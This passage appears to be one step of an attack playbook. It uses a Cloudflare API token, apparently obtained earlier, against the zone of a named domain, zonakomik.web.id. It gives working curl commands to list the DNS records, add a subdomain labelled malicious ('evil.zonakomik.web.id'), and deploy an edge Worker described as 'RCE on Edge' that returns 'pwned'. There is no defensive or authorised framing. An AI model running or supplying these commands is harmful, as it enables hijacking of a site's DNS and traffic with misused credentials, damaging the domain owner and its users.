##  Step 4 – Cloudflare Zone Management

The cf_api_token can manage the zone zonakomik.web.id.

### 4.1 List DNS Records
curl -s -H "Authorization: Bearer $CF_TOKEN" \
  "https://api.cloudflare.com/client/v4/zones/$CF_ZONE/dns_records" \
  | jq '.result[] | {name, content, type}'

### 4.2 Add a Malicious Subdomain
curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$CF_ZONE/dns_records" \
  -H "Authorization: Bearer $CF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type":"A",
    "name":"evil.zonakomik.web.id",
    "content":"1.2.3.4",
    "ttl":120,
    "proxied":false
  }'

### 4.3 Deploy a Cloudflare Worker (RCE on Edge)
curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$CF_ZONE/workers/script" \
  -H "Authorization: Bearer $CF_TOKEN" \
  -H "Content-Type: application/javascript" \
  --data 'addEventListener("fetch", event => event.respondWith(new Response("pwned")))'

